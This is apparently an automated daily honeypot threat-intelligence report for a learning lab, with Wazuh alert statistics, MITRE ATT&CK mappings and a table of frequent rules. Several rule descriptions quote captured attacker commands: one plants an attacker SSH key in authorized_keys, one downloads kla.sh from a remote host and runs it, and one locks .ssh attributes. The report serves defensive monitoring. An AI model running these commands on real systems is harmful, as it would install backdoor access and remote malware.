# LearningLab01 Daily Threat Intelligence Report — 2026-09-25

Generated: 2026-09-25T13:15:05.063Z

Report window: 2026-09-24T13:15:05.031Z through 2026-09-25T13:15:05.031Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 171,123 |
| Attack-related alerts | 15,503 |
| Honeypot interactions | 157,365 |
| Authentication failures | 2,375 |
| Authentication successes | 448 |
| Critical alerts | 393 |
| High alerts | 1,544 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 393 critical-severity alerts require priority review.
- 1,544 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 5.30:1.
- Country attribution currently covers only 3.39% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (103,347 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 393 | 0.23% |
| High | 1,544 | 0.90% |
| Medium | 2,370 | 1.38% |
| Low | 166,816 | 97.48% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 2,375
- Authentication successes: 448
- Failure-to-success ratio: 5.30:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 11,247 | 72.55% |
| Payload delivery | 11,247 | 72.55% |
| Authentication failure | 2,375 | 15.32% |
| Command execution | 1,361 | 8.78% |
| Reconnaissance | 132 | 0.85% |
| Malware | 112 | 0.72% |
| Web attack | 43 | 0.28% |
| Network scan | 19 | 0.12% |
| SMTP attack | 7 | 0.05% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 5,797 alerts, representing 3.39% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 165,326 | 96.61% | Not geolocated |
| New Zealand | 2,698 | 1.58% | ████████████████████ |
| Republic of Moldova | 2,308 | 1.35% | █████████████████ |
| Germany | 504 | 0.29% | ████ |
| United Kingdom | 138 | 0.08% | █ |
| United States | 62 | 0.04% | █ |
| Russia | 30 | 0.02% | █ |
| Indonesia | 20 | 0.01% | █ |
| Denmark | 6 | 0.00% | █ |
| Singapore | 6 | 0.00% | █ |
| France | 5 | 0.00% | █ |
| Malta | 3 | 0.00% | █ |
| Slovakia | 3 | 0.00% | █ |
| Sweden | 3 | 0.00% | █ |
| Turkey | 3 | 0.00% | █ |
| Ukraine | 3 | 0.00% | █ |
| Bulgaria | 2 | 0.00% | █ |
| Iran | 2 | 0.00% | █ |
| China | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Initial Access | 297 |
| Defense Evasion | 296 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Credential Access | 54 |
| Impact | 40 |
| Execution | 20 |
| Command and Control | 12 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Brute Force | 54 |
| Stored Data Manipulation | 36 |
| Command and Scripting Interpreter | 20 |
| Ingress Tool Transfer | 12 |
| Exploit Public-Facing Application | 6 |
| Data Destruction | 4 |
| File Deletion | 4 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 103,347 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (103,347) |
| 110207 | 5 | 12,269 | T-Pot SentryPeer SIP activity from [IP address]:6720, method ACK | tpot (12,269) |
| 110204 | 4 | 12,158 | T-Pot Honeytrap connection from [IP address] to port 5908 | tpot (12,158) |
| 110213 | 4 | 11,860 | T-Pot RDP connection from [IP address] to port 3389. | tpot (11,860) |
| 110205 | 6 | 11,180 | T-Pot Honeytrap received a payload from [IP address] | tpot (11,180) |
| 110219 | 4 | 5,687 | T-Pot CiscoASA web activity from [IP address]: Request timed out: TimeoutError('The read operation timed out') | tpot (5,687) |
| 23502 | 3 | 3,031 | The CVE-2012-4542 that affected linux-image-6.8.0-138-generic was solved due to an update in the agent or feed. | tpot (3,031) |
| 110101 | 3 | 2,810 | Cowrie SSH connection from [IP address]. | tpot (2,810) |
| 110102 | 5 | 2,375 | Cowrie failed login from [IP address] using username root. | tpot (2,375) |
| 110104 | 7 | 1,199 | Cowrie captured a command from [IP address]: cd ~; chattr -ia .ssh; lockr -ia .ssh | tpot (1,199) |
| 23505 | 10 | 1,160 | CVE-2017-13165 affects linux-image-6.8.0-142-generic | tpot (1,160) |
| 23508 | 3 | 953 | CVE-2012-4542 affects linux-image-6.8.0-142-generic (Missing information, CVE awaiting analysis) | tpot (953) |
| 23504 | 7 | 528 | CVE-2015-7837 affects linux-image-6.8.0-142-generic | tpot (528) |
| 110201 | 4 | 426 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (426) |
| 23506 | 13 | 245 | CVE-2021-3773 affects linux-image-6.8.0-142-generic | tpot (245) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 166 | PAM: Login session closed. | tpot (164), wazuh (2) |
| 110103 | 10 | 157 | Cowrie accepted login from [IP address] using username malik. | tpot (157) |
| 110109 | 13 | 142 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (142) |
| 110216 | 4 | 97 | T-Pot Mailoney received SMTP command from [IP address]: QUIT | tpot (97) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110105 | 12 | 86 | Cowrie captured a file download from [IP address]. | tpot (86) |
| 110221 | 7 | 75 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (75) |
| 2904 | 7 | 72 | Dpkg (Debian Package) half configured. | wazuh (44), tpot (28) |
| 110212 | 10 | 67 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (67) |
| 110106 | 10 | 54 | Cowrie detected repeated failed logins from [IP address]. | tpot (54) |
| 2902 | 7 | 54 | New dpkg (Debian Package) installed. | wazuh (32), tpot (22) |
| 110215 | 4 | 49 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (49) |
| 23503 | 5 | 48 | CVE-2018-1121 affects linux-image-6.8.0-142-generic | tpot (48) |
| 110223 | 5 | 43 | T-Pot HoneyAML received  request from  to  on port . | tpot (43) |
| 110220 | 8 | 42 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (42) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110208 | 7 | 29 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5085 | tpot (29) |
| 550 | 7 | 25 | Integrity checksum changed. | wazuh (17), tpot (8) |
| 110108 | 12 | 14 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (14) |
| 110214 | 9 | 14 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (14) |
| 2901 | 3 | 14 | New dpkg (Debian Package) requested to install. | tpot (7), wazuh (7) |
| 2903 | 7 | 14 | Dpkg (Debian Package) removed. | tpot (7), wazuh (7) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110217 | 7 | 7 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: mail FROM:<dpr@priv8shop.com> size=84  | tpot (7) |
| 110107 | 12 | 6 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (6) |
| 110225 | 13 | 6 | T-Pot HoneyAML detected a probable remote-code-execution and payload-delivery attempt from [IP address]. | tpot (6) |
| 110211 | 9 | 5 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (5) |
| 553 | 7 | 4 | File deleted. | wazuh (4) |
| 554 | 5 | 4 | File added to the system. | wazuh (4) |
| 110218 | 9 | 2 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (2) |
| 110222 | 9 | 2 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 203 | 9 | 2 | Agent event queue is full. Events may be lost. | tpot (2) |
| 86003 | 3 | 2 | Docker: Error message | tpot (2) |
| 11 | 4 | 1 | Unknown | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 202 | 7 | 1 | Agent event queue is 90% full. | tpot (1) |
| 205 | 3 | 1 | Agent event queue is back to normal load. | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
